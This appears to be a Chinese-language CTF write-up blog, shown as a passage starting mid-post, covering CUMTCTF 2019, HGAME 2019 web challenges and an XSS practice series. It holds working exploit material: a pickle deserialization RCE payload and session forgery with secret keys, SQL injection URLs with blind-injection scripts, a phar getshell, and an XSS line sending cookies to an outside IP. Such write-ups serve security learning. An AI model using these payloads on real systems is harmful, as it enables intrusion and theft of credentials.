-> var.';'.\n            '$ret = '.$this -> var.';'\n        );\n        return $ret;\n    }\n}\nclass K {\n    protected $fn;\n    public $name;\n    \n    function __toString(){\n        echo 'string';\n        $fn = $this -> fn;\n        return $fn();\n    }\n}\nclass U {\n    public $obj;\n\n    function __wakeup(){\n        if (!isset($this->obj->name) || $this->obj->name != \"iv4n\") {\n            $this -> obj -> fn = function(){};\n        }\n    }\n}\necho unserialize($_POST['obj'])->obj;\n```\n\nflag{0k_y0u_4lr3ady_kn0w_uns3ria1ize}\n\n### Baby Flask\n\nflask项目的网站，查看源代码可以看到github网址，给出了网站源码，\n\n```python\n#!/usr/bin/python3.6\nimport os\nimport pickle\n\nfrom base64 import b64decode\nfrom flask import Flask, request, render_template, session\n\napp = Flask(__name__)\n\n# add secret key to enable session\n# and this is a fake secret key, just an example\napp.config['SECRET_KEY'] = 'you_find_secret_key_congratulations'\n\nUser = type('User', (object,), {\n    'uname': 'test',\n    'is_admin': 0,\n    '__repr__': lambda o: o.uname,\n})\n\n@app.route('/', methods=('GET',))\ndef index_handler():\n    if not session.get('u'):\n        u = pickle.dumps(User())\n        session['u'] = u\n    return render_template('index.html')\n\n@app.route('/file', methods=('GET',))\ndef file_handler():\n    path = request.args.get('file')\n    path = os.path.join('static', path)\n    if not os.path.exists(path) or os.path.isdir(path) \\\n            or '.py' in path or '.sh' in path or '..' in path:\n        return 'disallowed'\n        \n    with open(path, 'r') as fp:\n        content = fp.read()\n    return content\n\n@app.route('/admin', methods=('GET',))\ndef admin_handler():\n    try:\n        u = session.get('u')\n        print(pickle.loads(b'\\x80\\x03cprogram_main_app@@@\\nUser\\nq\\x00)\\x81q\\x01.'))\n        if isinstance(u, dict): \n            u = b64decode(u.get('b'))\n        u = pickle.loads(u)\n        \n        if u.is_admin == 1:\n            return 'welcome, admin'\n        else:\n            return 'who are you?'\n    except Exception:\n        return 'uhh?'\n    \nif __name__ == '__main__':\n    app.run('0.0.0.0', port=80, debug=False)\n```\n\n可以看到file路由处可以进行文件读取\n\n![](https://i.loli.net/2019/05/04/5ccd332f17fc0.png)\n\n查看历史提交记录可以看到某个版本中有如下语句\n\n```python\napp.config['SECRET_KEY'] = os.getenv('secret_key')\n```\n\n可以看到环境变量中写入了秘钥值，结合上面的文件读取漏洞，我们可以读取到该秘钥值，也可以知道用户是iv4n\n\n![](https://i.loli.net/2019/05/04/5ccd33cc0a86f.png)\n\n读取到秘钥就可以伪造session了，查看admin的代码可以知到此处利用了pickle模块，该模块可以进行序列化操作，而且也存在反序列化漏洞，可以利用__reduce__方法来进行命令执行\n\n```python\nimport base64\nimport pickle\nimport os\n\nclass User(object):\n    def __reduce__(self):\n        a = \"`ls / -l > /home/iv4n/3.txt`\"\n        return (os.system,(a,))\n\nu = pickle.dumps(User())\nprint(u)\nbu = base64.b64encode(u)\nprint(bu)\n```\n\n这里坑的地方在于，当时我发现这个命令执行漏洞没有回显，所以我先尝试了反弹shell，结果bash反弹失败了，此处我尝试了将命令执行的结果写入文件中，然后读取文件即可，此处需要注意的是写入文件是有权限限制的，起初我想在根目录或者项目目录中写入文件，但是都失败了，估计是权限不够，必须找一个有权限的目录才行，我们前面已经知道了项目用户是iv4n，那么我们直接写入该用户的目录下不就行了，用上面的命令输出值之后进行session伪造即可（使用base64是为了防止编码问题）\n\n```\npy flask_session_cookie_manager3.py encode -s you_find_secret_key_congratulations -t {'u':{'b':b'gANjcG9zaXgKc3lzdGVtCnEAWD0AAABgY2F0IC9mMWxsMWxsMTQ0NGFhYWcvZjFsbDFsbDE0NDRhYWFnID4gL2hvbWUvaXY0di9ndWVzcy50eHRgcQGFcQJScQMu'}}\n```\n\n然后修改cookie，刷新admin页面，然后去读文件\n\n![](https://i.loli.net/2019/05/04/5ccd37814e80f.png)\n\n可以看到flag文件，直接读取即可\n\n![](https://i.loli.net/2019/05/04/5ccd37ed7cf35.png)\n\n> PS：反弹shell失败的原因在于我使用的是bash反弹shell，而题目环境中没有bash而是sh，而且也没有/dev/tcp文件，可以通过fork子进程来进行反弹shell\n\n我走的一个弯路在于一直想以admin身份登录（虽然登录之后毛都没有），但是一直报错，记录一下自己的方法\n\npickle模块在序列化类的时候，是不会序列化具体值的，我们解密cookie的值为\n\n```\n{'u':b'\\x80\\x03cprogram_main_app@@@\\nUser\\nq\\x00)\\x81q\\x01.'}\n```\n\n可以看到并没有包含User的具体字段的信息，换句话说我们即使本地修改了`is_admin`的值，在服务器端反序列化之后也并没有被记录，而是直接以代码中的定义来初始化，也就是\n\n```python\nUser = type('User', (object,), {\n    'uname': 'test',\n    'is_admin': 0,\n    '__repr__': lambda o: o.uname,\n})\n\n```\n`is_admin`又被初始化为0了，所以我们无法登陆成功，那么怎么解决这个问题呢？\n\n我们可以通过将`is_admin`设置为类属性来解决\n\n```python\nimport pickle\nimport base64\nclass User(object):\n    def __init__(self):\n        self.a = 2\n        self.is_admin = 1\na=User()\nc=pickle.dumps(a)\nprint(c)\nprint(base64.b64encode(c))\npickle.loads(c)\n```\n\n```\nb'\\x80\\x03c__main__\\nUser\\nq\\x00)\\x81q\\x01}q\\x02(X\\x01\\x00\\x00\\x00aq\\x03K\\x02X\\x08\\x00\\x00\\x00is_adminq\\x04K\\x01ub.'\n```\n\n可以看到`is_admin`被序列化了（个人理解是dump方法会序列化类的属性），然后需要注意一点，上面的输出包含`__mian__`，和我们从网站解密的对比一下\n\n\n> b'\\x80\\x03cprogram_main_app@@@\\nUser\\nq\\x00)\\x81q\\x01.' \n\n同样位置是`program_main_app@@@`，这应该是模块名，如果不对应的化反序列化会失败，此处我们也需要进行相应的修改，最终如下\n\n```\nb'\\x80\\x03cprogram_main_app@@@\\nq\\x00)\\x81q\\x01}q\\x02(X\\x01\\x00\\x00\\x00aq\\x03K\\x02X\\x08\\x00\\x00\\x00is_adminq\\x04K\\x01ub.'\n```\n\n# CUMTCTF_FINAL_2019\n\n## MISC\n\n### 委屈的兔兔\n\n打开图片，查看16进制即可在尾部看到unicode编码，解码即可得到flag\n\nkey{you are right}\n\n### 两岁半的猪\n\n拖进stegsolve就会简单移位就可以看到二维码\n\nflag{AppLeU0}\n\n### 寻找你的key\n\nzip伪加密，之后是一个exe文件，拖进16进制查看发现是反向的base64图片编码，在线解码即可得到二维码，扫描可得flag\n\nKEY{dca57f966e4e4e31fd5b15417da63269}\n\n### 302\n\n抓包去掉referer头可以看到base64编码图片，解码得到图片，然后还可以看到有个key字段，值为`123.com`，然后用key值在线解密网站解密即可\n\n```\nhttp://www.atool9.com/steganography.php\n```\n\nflag{85bb86974a2a33bd4032ea3b7264b831}\n\n## WEB\n\n### 签到题\n\nmd5弱比较\n\n```php\n$s = sanitize_user_input($_GET['s']);\n    $h = secured_hash_function($_GET['h']);\n    $r = gen_secured_random();\n    if($s != false && $h != false) {\n        if($s.$r == $h) {\n            print \"Well done! Here is your flag: \".$flag;\n        }\n```\n\n因为是将$s放在前面而且允许输入数字，那我们就可以利用MD5弱比较来进行绕过，右边生成一个0e开头的纯数字md5，左边直接输入0e与后面数字拼接即可验证通过\n\n\n\n\n\n### SQL注入\n\n测试列数，发现过滤，双写可以绕过\n\n```\nhttp://120.78.164.84:49098/list.php?id=1' oorrder by 4-- +\n```\n\n测试一下过滤，发现只过滤union，select，or，然后开始正常联合注入 \n\n数据库名ctf\n\n爆表名\n```\nhttp://120.78.164.84:49098/list.php?id=-1' ununionion seselectlect 1,group_concat(table_name),3 from infoorrmation_schema.tables where table_schema=database()-- +\n\nctf,f1ag1nit\n```\n爆列名\n\n```\nhttp://120.78.164.84:49098/list.php?id=-1' ununionion seselectlect 1,group_concat(column_name),3 from infoorrmation_schema.columns where table_name='f1ag1nit'-- +\n\nid,flag \n```\n\n爆flag时发现flag被过滤了，现在需要在不输入列名的情况下得到数据，百度搜索到一个方法\n\n```\nhttps://blog.csdn.net/qq_35078631/article/details/78589926\n```\n\n不过例子中的左右都是三列，使用union没有问题，而本题中f1ag1nit中只有两个字段，如果直接使用联合注入的话会因为列数不相等报错，所以我们需要给它认为加上一列，payload如下：\n\n```\nhttp://120.78.164.84:49098/list.php?id=-1' uniunionon seselectlect * from (seselectlect 1)a,(seselectlect 2)b,(seselectlect 3)c ununionion seselectlect * from f1ag1nit a,(selselectect 2) b limit 1,2-- +\n```\n\n```\nflag{3eaba49ada2ec0aa44ceaa7beee35401} \n```\n\n","tags":["CTF"],"categories":["writeup"]},{"title":"HGAME2019-Web-Week3&4","url":"/2019/03/02/hgame2019b/","content":"\n\n# week-3\n\n<!-- more -->\n\n## 神奇的MD5\n\n文件探测一下发现存在备份文件泄露`.login.php.swp`，核心代码如下\n```php\n<?php\nsession_start();\nerror_reporting(0);\nif (@$_POST['username'] and @$_POST['password'] and @$_POST['code'])\n{\n    $username = (string)$_POST['username'];\n    $password = (string)$_POST['password'];\n    $code     = (string)$_POST['code'];\n    if (($username == $password ) or ($username == $code)  or ($password == $code)) { \n        echo \"Your input can't be the same\";\n    } \n    else if ((md5($username) === md5($password)) and (md5($password) === md5($code))){\n        echo \"Good\"; \n    \n        header('Location: admin.php');  \n        exit();\n    } else {\n        echo \"<pre> Invalid password</pre>\";\n    }\n}\n```\n\n可以看到我们只要生成三个文件内容不同但是MD5值相同的文件就可以了，搜索了一下发现了一篇文章[link](https://xz.aliyun.com/t/3161)，有一个工具fastcoll就可以生成两个MD5值相同的不同文件\n\n1. 先生成两个MD5值相同的文件\n```bash\nfastcoll_v1.0.0.5.exe -o test0 test1\n```\n2. 然后根据test1再生成两个MD5值相同的文件，此时test00，test01的MD5值相同\n```\nfastcoll_v1.0.0.5.exe -p test1 -o test00 test01\n```\n3. 将test00的最后128位写入文件a，（-c 128 表示最后128位，tail读文件是从后往前读的，这128位正是test1和test00MD5不同的原因），同理处理一下test01\n```\ntail -c 128 test00 > a\ntail -c 128 test01 > b\n```\n4. 执行type命令将test0和a的内容写进test10中，将test0和b的内容写入test11\n```\ntype test0 a > test10\ntype test1 b > test11\n```\n\n于是就生成了test00，test01，test10，test11四个MD5值相同的文件，再用curl编码一下\n\n```\ncurl --data-urlencode username@C:\\Users\\Snow\\Desktop\\fastcoll_v1.0.0.5.exe\\test00 --data-urlencode password@C:\\Users\\Snow\\Desktop\\fastcoll_v1.0.0.5.exe\\test01 --data-urlencode code@C:\\Users\\Snow\\Desktop\\fastcoll_v1.0.0.5.exe\\test10 http://118.25.89.91:8080/question/login.php -i\n```\n\n之后可以得到服务器返回的cookie`Set-Cookie: PHPSESSID=ff92dae820810170f60ef2a04f027a61; path=/`，写入admin.php页面中，发现是个shell终端，可以查看到admin.php源码，关键过滤如下\n```php\n$cmd = str_replace(\"flag\",'none',$cmd);\n```\n绕过很简单，通配符与单引号都可以绕过\n\npayload：`cat /fl?? ` OR `cat /fl''ag`\n\nflag：`hgame{a1c83b66cc504d583c09ea6c20c0dabc}`\n\n## sqli-1\n\n```php\nsubstr(md5($_GET[\"code\"]),0,4) === 7229\n```\n\n题目需要验证码，可以爆破一下\n\n```php\nfor($i=0;$i<999999999;$i++){\n    if(substr(md5($i), 0, 4)==='803a'){\n        echo $i;\n        break;\n    }\n}\n```\n\n然后就是常规的数字型注入了，注意每次都要更新一下code值\n\n```\n?code=4446&id=1 order by 1--+\n```\n\n```\n?code=31226&id=-1 union select group_concat(table_name) from information_schema.tables where table_schema=database()--+\n```\n\n> f1l1l1l1g,words \n\n不知道为什么表名不对，猜测可能是表名有什么问题，所以用16进制编码一下\n\n```\n?code=70176&id=-1 union select group_concat(column_name) from information_schema.columns where table_name=0x66316c316c316c3167--+\n```\n\n> f14444444g\n\n```\n?code=51097&id=-1 union select f14444444g from f1l1l1l1g--+\n```\n\nflag: `hgame{sql1_1s_iNterest1ng}`\n\n## sqli-2\n\n依然数字型注入，只不过是盲注，本来不想写代码的，哎，还是逃不过。\n\nPS：由于没注意看题目，结果直接上来时间盲注了，但是等的真的绝望，后来才回过味来可以bool盲注，速度才上来了\n\n```python\nimport hashlib\nimport requests\nimport re\nimport string\ncookies = {'PHPSESSID':'lseqgohjo9eibfivnemk6sa8vd'}\ndef md5(_in):\n    m = hashlib.md5()\n    m.update(_in.encode('utf-8'))\n    return m.hexdigest()[0:4]\n\ndef get_code():\n    global url\n    res = requests.get(url, cookies=cookies).text\n    code = re.findall(r'=== (.{4})<br>',res)[0]\n    for i in range(9999999999999):\n        if code == md5(str(i)):\n            return str(i)\n\nurl = \"http://118.89.111.179:3001/\"\noutput = \"hgame{sqli_1s_s0_\"\nsucc = \"sql error\"\nname_dic = string.digits + string.ascii_lowercase + string.ascii_uppercase + '_{}'  + ','\n\nfor i in range(18,60):\n    for j in name_dic:\n        code = get_code()\n        # payload = f'?code={code}&id=1 and if((substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{str(i)},1)=\"{str(j)}\"),0,sleep(5))--+'\n        # F11111114G,WORDS\n        # payload = f'?code={code}&id=1 and if((substr((select group_concat(column_name) from information_schema.columns where table_name=\"F11111114G\"),{str(i)},1)=\"{str(j)}\"),0,sleep(5))--+'\n        # FL4444AG\n        payload = f'?code={code}&id=1 and if((substr((select FL4444AG from F11111114G),{str(i)},1)=binary \"{str(j)}\"),sleep(-5),1)--+'\n        res = requests.get(url+payload,cookies=cookies).text\n        if succ in res:\n            output += j\n            print(\"output: \",output)\n            break\n```\n\nflag如下\n\n```\nhgame{sqli_1s_s0_s0_s0_s0_interesting}\n```\n\n## 基础渗透\n\n正常注册登录，发现在点击不同的功能的时候是通过action参数来实现的，比如看到有`action=message`，猜测是不是存在文件包含，访问message.php页面发现果真存在，尝试文件包含\n\n```\nhttp://111.231.140.29:10080/index.php?action=php://filter/read=convert.base64-encode/resource=index\n```\n\n得到源码\n```php\n<?php\ninclude_once(\"template/header.php\");\nif (is_null($_SESSION['user_id'])) {\n    header('Location:/login.php');\n    exit();\n}\n$page = array_key_exists('action', $_GET) ? $_GET['action'] : 'message';\nrequire $page .'.php';\ninclude_once(\"template/footer.php\");\n?>\n```\n\nfunctions.php\n```php\n<?php\n//ini_set(\"display_errors\", \"on\");\nrequire_once('config.php');\nsession_start();\nfunction sql_query($sql_query)\n{\n    global $mysqli;\n    $res = $mysqli->query($sql_query);\n    return $res;\n}\nfunction csrf_token()\n{\n    $token = '';\n    $chars = str_split('0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ');\n    for ($i = 0; $i < 48; $i++) {\n        $token = $token . $chars[random_int(0, 61)];\n    }\n    $_SESSION['token'] = $token;\n    echo \"<input type='hidden' value='$token' id='token'>\";\n}\nfunction res_to_json($res, $type)\n{\n    $json['type'] = $type;\n    $json['status'] = \"true\";\n    $json[\"content\"] = array();\n    foreach ($res as $message) {\n\n        $array_tmp['user_id'] = $message['user_id'];\n        $array_tmp['user'] = $message['user'];\n        $array_tmp['avatar'] = get_avatar($message['user_id']) != null ? get_avatar($message['user_id'])['content'] : md5($message['user']);\n        $array_tmp['message'] = $message['content'];\n        $array_tmp['message_id'] = $message['message_id'];\n        $array_tmp['time'] = $message['date'];\n        array_push($json[\"content\"], $array_tmp);\n    }\n    $json[\"content\"] = $json[\"content\"];\n    return json_encode($json);\n}\nfunction judge($username, $password)\n{\n    if ($username == null) {\n        echo \"username's length error!\";\n        return false;\n    } elseif (strlen($password) < 6 or strlen($password) > 16) {\n        echo \"password's length error!\";\n        return false;\n    } else {\n        return true;\n    }\n}\nfunction register($username, $password, $token)\n{\n    if (judge($username, $password) == 1 and $token === $_SESSION['token']) {\n        $password = md5($password);\n        $sql_query = \"insert into `users`(`username`,`password`) VALUES ('$username','$password')\";\n        $res = sql_query($sql_query);\n        if ($res) {\n            echo 'register success!';\n        } else {\n            echo 'error!';\n        }\n    } else {\n        echo \"error!\";\n        return false;\n    }\n}\nfunction login($username, $password, $token)\n{\n    if (!isset($_SESSION['login']) and $token === $_SESSION['token']) {\n        $password = md5($password);\n        $sql_query = \"select * from `users` where `username`='$username' and `password`='$password'\";\n        $res = sql_query($sql_query);\n        if ($res->num_rows) {\n            $data = $res->fetch_array();\n            $_SESSION['user_id'] = $data['user_id'];\n            $_SESSION['user'] = $data['username'];\n            $_SESSION['groups'] = $data['groups'];\n            $_SESSION['login'] = 1;\n            setcookie('user', $_SESSION['user']);\n            setcookie('groups', $_SESSION['groups']);\n        } else {\n            echo \"error!\";\n            return false;\n        }\n    } else {\n        echo \"error!\";\n        return false;\n    }\n}\nfunction loginout()\n{\n    if ($_GET['loginout'] === $_SESSION['token']) {\n        session_destroy();\n        setcookie('groups', null);\n        setcookie('user', null);\n        Header(\"Location: index.php\");\n    }\n}\nfunction get_avatar($user_id)\n{\n    $sql_query = \"select `avatar` from `users` where `user_id`=$user_id\";\n    $res = sql_query($sql_query)->fetch_row()[0];\n    if ($res) {\n        return array('name' => $res, 'content' => base64_encode(file_get_contents('./img/avatar/' . $res . '.png')));\n    } else {\n        return null;\n    }\n}\nfunction get_new_messages()\n{\n    $start = $_GET['start'] ?? 0;\n    $start = addslashes($start);\n    $user_id = $_SESSION['user_id'];\n    $sql_query = \"select * from `messages` where `user_id`=$user_id LIMIT $start,999999999999\";\n    $res = sql_query($sql_query);\n    if ($res->num_rows) {\n        return res_to_json($res, \"messages\");\n    }\n}\nfunction get_messages()\n{\n    $start = $_GET['start'] ?? 0;\n    $start = addslashes($start);\n    $user_id = $_SESSION['user_id'];\n    $sql_query = \"select * from `messages` where `user_id`=$user_id ORDER BY `message_id` DESC LIMIT $start,12\";\n    $res = sql_query($sql_query);\n    if ($res->num_rows) {\n        return res_to_json($res, \"messages\");\n    }\n}\nfunction add_message($message)\n{\n    if ($_POST['token'] === $_SESSION['token']) {\n        if (isset($_SESSION['login']) and mb_strlen($message) > 6) {\n            $user_id = $_SESSION['user_id'];\n            $user = $_SESSION['user'];\n            $sql_query = \"insert into `messages`(`user_id`,`user`,`content`) VALUES($user_id,'$user','$message')\";\n            sql_query($sql_query);\n        } elseif (!isset($_SESSION['login'])) {\n            echo \"login error\";\n        } else {\n            echo \"length error\";\n        }\n    }\n}\nfunction delete_message($message_id)\n{\n    $user_id = $_SESSION['user_id'];\n    if ($_POST['token'] === $_SESSION['token']) {\n        if ($_SESSION['groups'] == 0) {\n            $sql_query = \"delete from `messages` where `message_id`=$message_id and `user_id`=$user_id\";\n        } elseif ($_SESSION['groups'] == 1) {\n            $sql_query = \"delete from `messages` where `message_id`=$message_id\";\n        }\n        sql_query($sql_query);\n    }\n}\nfunction rand_filename()\n{\n    $tmp = `cat /dev/urandom | head -n 10 | md5sum | head -c 15`;\n    $sql_query = \"select `avatar` from `users` where `avatar`=$tmp\";\n    $res = sql_query($sql_query);\n    if ($res->num_rows) {\n        return rand_filename();\n    } else {\n        return $tmp;\n    }\n}\nfunction upload_avatar()\n{\n    $type = $_FILES['file']['type'];\n    $user_id = $_SESSION['user_id'];\n    if ($type == 'image/gif' || $type == 'image/jpeg' || $type == 'image/png') {\n        $avatar = get_avatar($user_id);\n        if ($avatar == null) {\n            $name = rand_filename();\n            move_uploaded_file($_FILES['file']['tmp_name'], \"./img/avatar/\" . $name . \".png\");\n            $sql_query = \"update `users` set `avatar`='$name' WHERE `user_id`=$user_id\";\n            sql_query($sql_query);\n        } else {\n            move_uploaded_file($_FILES['file']['tmp_name'], \"./img/avatar/\" . $avatar['name'] . \".png\");\n\n        }\n    }\n}\nfunction change_password($opassword, $npassword, $npasswod_again)\n{\n    if (judge($_SESSION['user'], $npassword)) {\n        if ($npasswod_again !== $npassword) {\n            echo \"difference error\";\n        } else {\n            $user_id = $_SESSION['user_id'];\n            $sql_query = \"select `password` from `users` where `user_id`=$user_id\";\n            $res = sql_query($sql_query);\n            if ($res->num_rows) {\n                if ($res->fetch_row()[0] === md5($opassword)) {\n                    $sql_query = \"update `users` set `password`=md5($npassword) WHERE `user_id`=$user_id\";\n                    $res = sql_query($sql_query);\n                    echo $res;\n                    echo \"successful\";\n                } else {\n                    echo \"oldpassword error\";\n                }\n            }\n        }\n\n    }\n}\n```\n\n审计代码可知，存在一处图片上传，但是不知道文件名，题目中有很多sql语句，都用addslashes()函数转义过了，字符型注入无法实施，但是在delete_message中存在数字型注入<code>$sql_query = \"delete from `messages` where `message_id`=$message_id and `user_id`=$user_id\";</code>，参数可控且没有单引号（addslashes()过滤无效），我们可以通过时间盲注来获取我们当前用户对应的文件名，token是一次一刷新，需要每次都获取，代码如下\n```python\nimport requests\nimport re\n\ncookies = {\n    \"groups\":\"0\",\n    \"PHPSESSID\":\"c419fq3ppu11r1o2tra4l9rlnm\",\n    \"user\":\"snowtest\"\n}\nurl_del = 'http://111.231.140.29:10080/messages_api.php?action=delete'\nurl = 'http://111.231.140.29:10080/index.php?action=message'\nmessage = \"7469 and if(ascii((substr((select avatar from users where username like 0x736e6f777425 limit 1),{},1)))={},sleep(5),0)#\"\navatar = ''\nfor i in range(1,100):\n    for j in range(34,127):\n        r = requests.get(url,cookies=cookies)\n        token = re.findall(r\"value='(.*)' id='token'>\",r.text)[0]\n        data = dict(token=token,message_id=message.format(i,j))\n        try:\n            r = requests.post(url_del,cookies=cookies,data=data,timeout=4)  \n        except:\n            avatar += chr(j)\n            print(avatar)\n            break\n```\n可以得到我的账号对应的文件名为`1bce72251d3c333`，在upload_avatar()中会在文件名后面强行拼接png后缀`move_uploaded_file($_FILES['file']['tmp_name'], \"./img/avatar/\" . $name . \".png\");`，也就是最终上传的文件名会被命名为`1bce72251d3c333.png`，如果直接写入shell肯定是无法执行的，不过前面我们读源码的时候利用了`require $page .'.php';`，所以我们可以利用phar协议来getshell，在本地写一个shell，然后打包为zip文件，修改文件头并上传\n\n![](https://i.loli.net/2019/02/19/5c6bdd1d45b16.png)\n然后上传，之后访问`http://111.231.140.29:10080/index.php?action=phar://img/avatar/1bce72251d3c333.png/shell`即可getshell\n\n然后就是文件探测了，可以使用find命令`snow=system('find / -name \"*flag*\"');`，最终payload\n\n![](https://i.loli.net/2019/02/19/5c6bde110e9a2.png)\n\n```\nhgame{e4616b38e22d1a22cedc53a90cfaa87f75ccbfe565399857a390950a58a94e68} \n```\n## BabyXss\n\n题目环境有点问题\n\n<!-- <scr<script>ipt>$.get('http://120.77.176.134/?cookie=' + document.cookie);</scr<script>ipt> -->\n\n# WEEK-4\n\n## happypython\n\npython下的ssti，自己当时做的时候想到了要获取secret_key的思路，但是可惜没想到ssti，自己对框架相关问题了解的太少了，以后要在这方面加强一下，简单测试一下可以发现该框架是存在模板注入的问题的`{%raw%}http://118.25.18.223:3001/{{1+1}}{%endraw%}`\n\n![](https://i.loli.net/2019/02/26/5c7529f34783c.png)\n\n接下来读取配置文件`{%raw%}http://118.25.18.223:3001/{{config}}{%endraw%}`，可以获取到secret_key\n\n![](https://i.loli.net/2019/02/26/5c752a50e3200.png)\n\n解一下cookie\n\n```\npython session.py decode -c .eJwlj0FqQzEMBe_idRaSLMl2LvORZYmGQAv_J6vSu8fQ1ayGee-3HHnG9VXur_Mdt3I8VrkXEETAdKvkc1EbK5fG0D4oXKR3DND0qSbUGy1gHwTeONI8RxCLVOWuWmU2iC27qzNrwuSKCpDTbCipEfQxyY3Fos2-nGKWW_HrzOP184zvvUexCUtm3wzlXRAbKQwzrCOtMJJel2zvfcX5fwIRy98HJ4Y_iA.XHUmGA.wO2v6jNOPBHknlA5tAqik2bE_hI -s 9RxdzNwq7!nOoK3*\n```\n\n```\n{u'csrf_token': u'617545ff8175e64f9e5a9f540bea812dea2583d5', u'_fresh': True, u'user_id': u'111', u'_id': u'051101fca32cbd279dfd6e96892ec55881e06fcb6a52872d04c920c74efacf9e245536486635b70ed6ecc6c446f0b431600fbaa9626a2089b2ca45ae7b8dc2eb'}\n```\n\n猜测user_id可能代表的是用户id，猜测admin的用户ID为1，修改一下id为1伪造cookie\n\n```\npython session_cookie_manager.py encode -s 9RxdzNwq7!nOoK3* -t {'csrf_token':'617545ff8175e64f9e5a9f540bea812dea2583d5','_fresh':True,'user_id':'1','_id':'0 51101fca32cbd279dfd6e96892ec55881e06fcb6a52872d04c920c74efacf9e245536486635b70ed6ecc6c446f0b431600fbaa9626a208 9b2ca45ae7b8dc2eb'}\n```\n\n然后将生成的cookie覆盖原来cookie即可得到flag\n\n![](https://i.loli.net/2019/02/26/5c752b920389a.png)\n\n```\nhgame{Qu_bu_la1_m1ng_z1_14} \n```\n\nps: 这题我入了一个坑点，在伪造cookie的时候，命令行下老是报错`ValueError: dictionary update sequence element #0 has length 1; 2 is required`，查看了一下代码发现是在dict()函数处报错的\n\n```python\n session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))\n```\n\n但是同样的代码在linux下就可以正常运行，测试了一下发现在windows下dict的参数其实是类似于`{aa:aa}`，而linux下却是`{'aa':'aa'}`，命令行输入是完全相同的，显然windows下的参数无法正确执行，经过研究发现是`\"`捣的鬼，在windows下我们输入的`\"`是不会被捕获的，只会捕获双引号里面的内容，而单引号不存在这个问题，如果想要输入双引号必须要反斜杠转义，举个例子\n\n```python\nimport sys\nfor i in range(4):\n    print(sys.argv[i])\n```\n\n我们输入`python b.py \"key\":\"value\" 'key':'value' \\\"\\'`，此时输出为\n```\nb.py\nkey:value\n'key':'value'\n\"\\'\n```\n\n这就是区别，应该是windows特性的问题，自己被坑了好久还以为自己做的不对（泪奔~\\~~~~）\n\n## happyPHP\n\n正常注册之后登录，查看源代码可以得到项目源代码`!--https://github.com/Lou00/laravel-->`\n\n审计代码时，一般应该从路由开始看起，看一共有哪些页面，实现了哪些功能，对于laraval来说，我们先从routes/web.php开始审计\n\n![](https://i.loli.net/2019/02/27/5c75e272afb23.png)\n\n可以看到实现的路由，例如对第一行来说，表示的意思就是将根目录发送给StaticPagesController控制器下的home方法进行解析，name方法用来命令路由，便于后期的维护。\n\napp中的文件是框架的核心控制部分，我们查看一下该部分看看，在SessionController.php中发现了问题\n\n```php\nif (Auth::attempt($credentials)) {\n    if (Auth::user()->id ===1){\n        session()->flash('info','flag :******');\n        return redirect()->route('users.show');\n    }\n    $name = DB::select(\"SELECT name FROM `users` WHERE `name`='\".Auth::user()->name.\"'\");\n    session()->flash('info', 'hello '.$name[0]->name);\n    return redirect()->route('users.show');\n}\n```\n\n可以看到此处存在sql语句，在laraval中有更加安全的sql查询方式，这儿显然存在问题的，存在sql注入问题，我们可以注册一个用户名为`' union select group_concat(email,password) from users where id=1#`，然后登录即可获得该用户的email和密码（因为题目要求id=1的用户登录才可以得到flag），\n\n```\nadmin@hgame.comeyJpdiI6InJuVnJxZkN2ZkpnbnZTVGk5ejdLTHc9PSIsInZhbHVlIjoiRWFSXC80ZmxkT0dQMUdcL2FESzhlOHUxQWxkbXhsK3lCM3Mra0JBYW9Qb2RzPSIsIm1hYyI6IjU2ZTJiMzNlY2QyODI4ZmU2ZjQxN2M3ZTk4ZTlhNTg4YzA5N2YwODM0OTllMGNjNzIzN2JjMjc3NDFlODI5YWYifQ== \n```\n\n密码是经过加密的，解密一下\n\n> {\"iv\":\"rnVrqfCvfJgnvSTi9z7KLw==\",\"value\":\"EaR/4fldOGP1G/aDK8e8u1Aldmxl+yB3s+kBAaoPods=\",\"mac\":\"56e2b33ecd2828fe6f417c7e98e9a588c097f083499e0cc7237bc27741e829af\"}\n\n查看配置文件可以发现使用了aes加密，但是key值不知道\n```\n'key' => env('APP_KEY'),\n'cipher' => 'AES-256-CBC',\n```\n\n回滚git版本找到key值\n\n> APP_KEY=base64:9JiyApvLIBndWT69FUBJ8EQz6xXl5vBs7ofRDm9rogQ=\n\n接下来编写解密脚本\n```python\nimport base64\nfrom Crypto.Cipher import AES\n\niv = 'rnVrqfCvfJgnvSTi9z7KLw=='\nvalue = 'EaR\\/4fldOGP1G\\/aDK8e8u1Aldmxl+yB3s+kBAaoPods='\nenc = '9JiyApvLIBndWT69FUBJ8EQz6xXl5vBs7ofRDm9rogQ='\nenc = base64.b64decode(enc)\niv = base64.b64decode(iv)\nvalue = base64.b64decode(value)\ncryptor = AES.new(enc,AES.MODE_CBC,iv)\ncon = cryptor.decrypt(value)\nprint con\n```\n\n可以得到密码为`9pqfPIer0Ir9UUfR`，登录即可得到flag\n\n![](https://i.loli.net/2019/02/27/5c75f88d0fb45.png)\n\n***Reference：***\n\n1. [https://xz.aliyun.com/t/3161](https://xz.aliyun.com/t/3161)\n2. [https://zry.io/archives/183](https://zry.io/archives/183)","tags":["CTF"],"categories":["writeup"]},{"title":"XSS20冲关之旅","url":"/2019/03/02/xss20/","content":"\n# 前言\n\n最近学到了xss漏洞，来做一下这个xss题目\n\n<!-- more -->\n\n# XSS-1\n\n第一关热身，没有任何过滤。payload：`<script>alert('xss')</script>`\n\n# XSS-2\n\n查看代码可知\n```php\n$str = $_GET[\"keyword\"];\necho \"<h2 align=center>没有找到和\".htmlspecialchars($str).\"相关的结果.</h2>\".'<center>\n<form action=level2.php method=GET>\n<input name=keyword  value=\"'.$str.'\">\n```\n\n对于输入的内容，题目使用了htmlspecialchars来转义特殊字符，此处不好绕过，但是题目在input标签中却没有验证参数而直接输入，此时我们可以构造payload闭合input标签\n\npayload: `keyword=\">  <script>alert('xss')</script>`，此时在代码中input标签的内容就变成\n```\n<input name=keyword value=\"\">  <script>alert('xss')</script>\">\n```\n\n成功成为了两个标签从而xss成功\n\n# XSS-3\n\n这此input标签也被转义了，所以只能正面绕过htmlspecialchar()函数了，百度可以发现该函数默认是不转义单引号的，只有设置了quotestyle 选项为ENT_QUOTES才会过滤单引号，而本题又是单引号闭合的所以用单引号即可绕过\n\npayload: `http://localhost/xss20/level3.php?keyword=' onclick='window.alert()'`\n\n![](https://i.loli.net/2019/03/01/5c78e10f13d0e.png)\n\n# 